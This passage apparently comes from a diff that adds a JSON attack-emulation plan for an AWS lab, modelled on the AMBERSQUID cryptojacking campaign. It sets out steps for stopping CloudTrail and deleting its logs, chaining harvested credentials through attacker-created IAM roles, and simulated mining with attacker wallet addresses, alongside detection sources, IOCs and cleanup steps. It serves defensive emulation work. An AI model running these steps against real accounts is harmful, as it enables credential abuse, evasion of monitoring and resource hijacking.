+            "args": {"Bucket": "ambersquid-cloudtrail-logs-<account-id>", "Key": "<most-recent-log-key>"},
+            "note": "Deletes most recent log file only. Full AMBERSQUID behavior deletes all logs. Lab: limit to 1 object."
+          },
+          {
+            "service": "codecommit",
+            "method": "list_repositories",
+            "args": {},
+            "credential_override": "codecommit_role_session",
+            "note": "Enumerates repos as precursor to deletion. Demonstrates AWSCodeCommit-Role used in T1070 phase per TI credential_chain."
+          }
+        ]
+      },
+      "expected_audit_events": [
+        {"eventName": "StopLogging", "eventSource": "cloudtrail.amazonaws.com"},
+        {"eventName": "DeleteTrail", "eventSource": "cloudtrail.amazonaws.com"},
+        {"eventName": "DeleteObject", "eventSource": "s3.amazonaws.com"}
+      ],
+      "audit_visible": true,
+      "detection_sources": ["CloudTrail management events (captured before StopLogging takes effect)", "CloudWatch Alarm: CloudTrail-StopLogging", "GuardDuty: Stealth:IAMUser/CloudTrailLoggingDisabled", "Security Hub: CloudTrail.1"],
+      "cleanup_actions": [
+        "cloudtrail:StartLogging ambersquid-cloudtrail — re-enable IMMEDIATELY after test completes",
+        "S3 bucket versioning is enabled on ambersquid-cloudtrail-bucket — deleted objects recoverable via S3 version restoration"
+      ],
+      "operational_tempo": {"delay_after_seconds": [2, 5]},
+      "risk_level": "high",
+      "iocs_generated": [
+        "CloudTrail StopLogging event — highest-fidelity detection signal in entire kill chain",
+        "S3 DeleteObject on CloudTrail log prefix",
+        "GuardDuty finding: Stealth:IAMUser/CloudTrailLoggingDisabled",
+        "CloudWatch Alarm trigger: CloudTrailLoggingDisabled"
+      ]
+    },
+    {
+      "step": 13,
+      "phase": 11,
+      "technique_id": "T1496",
+      "technique_name": "Resource Hijacking",
+      "tactic": "Impact",
+      "execution_context": "container_attack",
+      "target_resource": "ambersquid-ecs-cluster",
+      "description": "Attacker's containers execute SRBMiner-MULTI targeting ZEPHYR, TRX, RVN, and XMR mining pools via configured wallet addresses. Simulated — the ECS task running from Step 3 uses ubuntu:22.04 with 'sleep infinity'. No real miner binary, no mining pool connections. All known mining pool ports (3333, 4444, 5555, 7777, 8888, 9999, 14444, 45560) are blocked by ambersquid-task-sg.",
+      "implementation": {
+        "method": "Verify the ECS task from Step 3 is still running. Log mock mining output. No additional API calls launch new compute.",
+        "credential_source": "victim_creds",
+        "api_calls": [
+          {
+            "service": "ecs",
+            "method": "describe_tasks",
+            "args": {"cluster": "ambersquid-ecs-cluster", "tasks": ["<task-arn-from-step-3>"]},
+            "note": "Confirms task still running — no additional launch needed. Container running 'sleep infinity' is the benign miner stand-in."
+          }
+        ],
+        "simulation_note": "SIMULATED: attack.py logs 'SIMULATED [T1496]: SRBMiner-MULTI would connect to 2miners/c3pool/nanopool on ports 3333/4444/5555. Wallet addresses: ZEPHYR2vyrpcg2e2sJaA88EM6aGaLCBdiYfiHffrs5b3Fa4p1qpoEPH4UabmhJr5YYF7CxJykLTJmESQWaB9ARNuhb6jvptapVq3v (ZEPHYR), TFrQ7u9spKk8MBgX6Bze3oxPbs3Yh1tAsq (TRX), and others. Mining pool ports blocked by ambersquid-task-sg. Mock miner exits immediately.'"
+      },
+      "expected_audit_events": [],
+      "audit_visible": false,
+      "detection_sources": ["VPC Flow Logs: outbound connections to mining pool IP ranges", "GuardDuty: CryptoCurrency:EC2/BitcoinTool.B!DNS", "Network firewall mining pool domain and IP blocklists"],
+      "cleanup_actions": [
+        "ecs:StopTask on all running tasks in ambersquid-ecs-cluster",
+        "Confirm no outbound mining pool connections via VPC Flow Logs review"
+      ],
+      "operational_tempo": {"delay_after_seconds": [5, 10]},
+      "risk_level": "low",
+      "iocs_generated": [
+        "SIMULATED: Outbound TCP to 2miners, c3pool, nanopool — blocked by ambersquid-task-sg",
+        "SIMULATED: Crypto wallet addresses in container process arguments",
+        "SIMULATED: Exfil endpoints — 2miners, c3pool, nanopool",
+        "ECS container describe call from non-console IAM session (post-StopLogging)"
+      ]
+    }
+  ],
+  "credential_chain": [
+    {
+      "id": "victim_creds",
+      "phase": 3,
+      "source": "Victim AWS credentials (AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY) injected as plaintext environment variables into ambersquid-task-definition ECS container. Harvested by attacker's container entrypoint.sh on startup.",
+      "technique": "T1204.003",
+      "type": "static_key",
+      "session_name": "victim_session",
+      "used_in_phases": [4, 5, 6, 9, 11, 12, 13],
+      "expiration": "long-lived — IAM user static key, never expires unless rotated by victim"
+    },
+    {
+      "id": "codecommit_role_session",
+      "phase": 6,
+      "source": "STS AssumeRole on AWSCodeCommit-Role created in T1136.003 (step 5) using victim_creds. Session tokens obtained in T1098.001 (step 6).",
+      "technique": "T1098.001",
+      "type": "sts_session",
+      "session_name": "codecommit_session",
+      "used_in_phases": [7, 8, 12],
+      "expiration": "3600 seconds from assumption time"
+    },
+    {
+      "id": "sugo_role_session",
+      "phase": 6,
+      "source": "STS AssumeRole on sugo-role created in T1136.003 (step 5) using victim_creds. Session tokens obtained in T1098.001 (step 6).",
+      "technique": "T1098.001",
+      "type": "sts_session",
+      "session_name": "sugo_session",
+      "used_in_phases": [7],
+      "expiration": "3600 seconds from assumption time"
+    },
+    {
+      "id": "ecs_exec_role_session",
+      "phase": 6,
+      "source": "STS AssumeRole on ecsTaskExecutionRole (attacker-created with AdministratorAccess) created in T1136.003 (step 5) using victim_creds. Session tokens obtained in T1098.001 (step 6).",
+      "technique": "T1098.001",
+      "type": "sts_session",
+      "session_name": "ecs_exec_session",
+      "used_in_phases": [7, 10],
+      "expiration": "3600 seconds from assumption time"
+    }
+  ],
+  "script_manifest": {
+    "attack_script": "attack.py",
+    "description": "Single unified Python attack script managing credential chain across all phases. Reads victim credentials from environment variables AWS_VICTIM_ACCESS_KEY_ID and AWS_VICTIM_SECRET_ACCESS_KEY (or Pulumi stack output). Constructs victim_creds boto3 session, then assumes AWSCodeCommit-Role, sugo-role, and ecsTaskExecutionRole to build three parallel role sessions. Executes all 13 kill chain steps in TI order with configurable inter-step delays. Simulated steps log 'SIMULATED [TXXXX]:' prefix and execute only safe dry-run API calls.",
+    "entry_point": "main(target_info)",
+    "phases": [
+      {"phase": 1, "name": "Resource Development", "techniques": ["T1583.001", "T1608.001"], "context": "api_attack"},
+      {"phase": 2, "name": "Initial Execution — Malicious Container", "techniques": ["T1204.003"], "context": "container_attack"},
+      {"phase": 3, "name": "Credential Validation", "techniques": ["T1078.004"], "context": "api_attack"},
+      {"phase": 4, "name": "Persistence — IAM Role Creation and Session Establishment", "techniques": ["T1136.003", "T1098.001"], "context": "api_attack"},
+      {"phase": 5, "name": "Execution — Multi-Service Miner Deployment", "techniques": ["T1059.009"], "context": "api_attack"},
+      {"phase": 6, "name": "Persistence — Internal Code Implant", "techniques": ["T1525"], "context": "api_attack"},
+      {"phase": 7, "name": "Discovery — Cloud Infrastructure Enumeration", "techniques": ["T1580"], "context": "api_attack"},
+      {"phase": 8, "name": "Defense Evasion — Container Deployment", "techniques": ["T1610"], "context": "container_attack"},
+      {"phase": 9, "name": "Defense Evasion — Compute Scaling", "techniques": ["T1578.002"], "context": "api_attack"},
+      {"phase": 10, "name": "Defense Evasion — Indicator Removal", "techniques": ["T1070"], "context": "api_attack"},
+      {"phase": 11, "name": "Impact — Resource Hijacking (Mock Miner)", "techniques": ["T1496"], "context": "container_attack"}
+    ]
+  },
+  "cleanup_manifest": {
+    "attack_created_resources": [
+      {"type": "iam_role", "name": "AWSCodeCommit-Role", "cleaned_during_attack": false},
+      {"type": "iam_role", "name": "sugo-role", "cleaned_during_attack": false},
+      {"type": "iam_role", "name": "ecsTaskExecutionRole (attacker-created — distinct from Pulumi ambersquid-ecs-execution-role)", "cleaned_during_attack": false},
+      {"type": "amplify_app", "name": "miner-app", "cleaned_during_attack": false},
+      {"type": "codebuild_project", "name": "miner-build-small", "cleaned_during_attack": false},
+      {"type": "ecs_cluster", "name": "miner-cluster", "cleaned_during_attack": false},
+      {"type": "ecs_task_definition", "name": "miner-task (all revisions)", "cleaned_during_attack": false},
+      {"type": "ecs_task_definition", "name": "miner-fargate-task (all revisions)", "cleaned_during_attack": false},
+      {"type": "ecs_task", "name": "Running task in ambersquid-ecs-cluster (from Step 3)", "cleaned_during_attack": false},
+      {"type": "sagemaker_notebook_instance", "name": "miner-notebook", "cleaned_during_attack": false},
+      {"type": "codecommit_repository", "name": "test in us-west-2 (if successfully created in Step 7)", "cleaned_during_attack": false},
+      {"type": "cloudtrail_logging_state", "name": "ambersquid-cloudtrail (stopped — must be re-enabled before pulumi destroy)", "cleaned_during_attack": false},
+      {"type": "s3_objects_deleted", "name": "CloudTrail log objects deleted from ambersquid-cloudtrail-bucket (S3 versioning enabled — restorable)", "cleaned_during_attack": false}
+    ],
+    "pulumi_managed_resources": "All resources in infra_plan.json destroyed by pulumi destroy — including ambersquid-codecommit-repo (us-east-1), ambersquid-cloudtrail, ambersquid-cloudtrail-bucket, ambersquid-terraform-state-bucket, ambersquid-canary-secret, ambersquid-honey-iam-user, ambersquid-ecs-cluster, ambersquid-task-definition, ambersquid-vpc and all networking.",
+    "cleanup_order": [
+      "1. Re-enable CloudTrail: cloudtrail:StartLogging ambersquid-cloudtrail — do this FIRST before any other cleanup",
+      "2. Stop running ECS tasks: ecs:StopTask on all tasks in ambersquid-ecs-cluster",
+      "3. Stop SageMaker notebook: sagemaker:StopNotebookInstance miner-notebook — wait for Stopped state (may take 2-3 minutes)",
+      "4. Delete SageMaker notebook: sagemaker:DeleteNotebookInstance miner-notebook",
+      "5. Delete Amplify app: amplify:DeleteApp miner-app",
+      "6. Delete CodeBuild project: codebuild:DeleteProject miner-build-small",
+      "7. Deregister ECS task definitions: ecs:DeregisterTaskDefinition miner-task and miner-fargate-task all revisions",
+      "8. Delete ECS cluster: ecs:DeleteCluster miner-cluster",
+      "9. Detach all policies then delete IAM roles: AWSCodeCommit-Role, sugo-role, ecsTaskExecutionRole (attacker-created)",
+      "10. Delete CodeCommit repo in us-west-2 if created: codecommit:DeleteRepository test",
+      "11. pulumi destroy — destroys all Pulumi-managed resources"
+    ]
+  },
+  "dwell_time_recommendation_seconds": 600,
+  "total_techniques": 13,
+  "total_attack_steps": 13,
+  "mitre_tactics_covered": [
+    "Resource Development",
+    "Execution",
+    "Defense Evasion",
+    "Persistence",
+    "Discovery",
+    "Impact"
+  ]
+}
